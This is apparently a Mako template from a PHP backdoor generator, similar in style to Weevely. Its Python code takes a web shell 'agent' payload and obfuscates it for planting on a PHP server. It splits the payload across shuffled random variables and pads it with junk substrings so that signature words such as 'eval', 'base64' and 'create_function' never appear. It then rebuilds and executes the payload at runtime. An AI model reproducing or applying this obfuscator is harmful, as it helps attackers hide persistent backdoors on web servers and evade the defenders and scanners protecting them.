<?php<%!
import random
import itertools
import string
import re
import pipes
import utils
%><%

# Does not include \ to avoid escaping termination quotes
def find_substr_not_in_str(str, characters = string.letters + string.digits + '!"#$%&()*+,-./:;<=>?@[]^_`{|}~'):
	while True:
		substr = utils.strings.randstr(2, False, characters)
		if not substr in str:
			return substr

def obfuscate(str, obf, division, dangerous):
	while True:
		polluted = obf.join(list(utils.strings.divide(str, 0, division, len(str)/division)))

		found = False
		for dang in dangerous:
			if dang in polluted:
				found = True

		if not found:
			return polluted

# Try to minify
agent_minified = re.sub('[\n\r\t]','',agent)

obfuscation_agent = find_substr_not_in_str(agent_minified)
obfuscated_agent = obfuscate(agent_minified, obfuscation_agent, 6, ('eval', 'base64', 'gzuncompress', 'gzcompress'))

agent_splitted_line_number = random.randint(10,14)

agent_splitted = list(utils.strings.divide(obfuscated_agent, len(obfuscated_agent)/agent_splitted_line_number-random.randint(0,5), len(obfuscated_agent)/agent_splitted_line_number, agent_splitted_line_number))

agent_variables = list(string.letters[:])
random.shuffle(agent_variables)
agent_variables_references = agent_variables[:]

# TODO: if a / is just before the endin quote, it will be uncorrectly escaped.
# Fix this (wrap data between " and use json.dump?)

agent_list = []
for line in agent_splitted:
	# Lines are quoted now and not before (could separate escape and quote on splitting)
	line = pipes.quote(line)

	# Replace all the \ with \\, to avoid to escape the trailing quote.
	line = re.sub('\\\\','\\\\\\\\', line)

	agent_list.append((agent_variables.pop(0), '%s;' % line))

obfuscation_createfunc = find_substr_not_in_str('create_function', string.letters)
obfuscated_createfunc = obfuscate('create_function', obfuscation_createfunc, 2, ())

agent_list.append((agent_variables.pop(0), "str_replace('%s','','%s');" % (obfuscation_createfunc, obfuscated_createfunc)))

random.shuffle(agent_list)
%>
% for line in agent_list:
$${line[0]}=${line[1]}
% endfor
$${agent_variables.pop(0)}=str_replace('${obfuscation_agent}','',$${'.$'.join(agent_variables_references[:agent_splitted_line_number])});
$${agent_variables.pop(0)}=$${agent_variables_references[agent_splitted_line_number]}('',$${agent_variables_references[agent_splitted_line_number+1]});$${agent_variables_references[agent_splitted_line_number+2]}();
?>
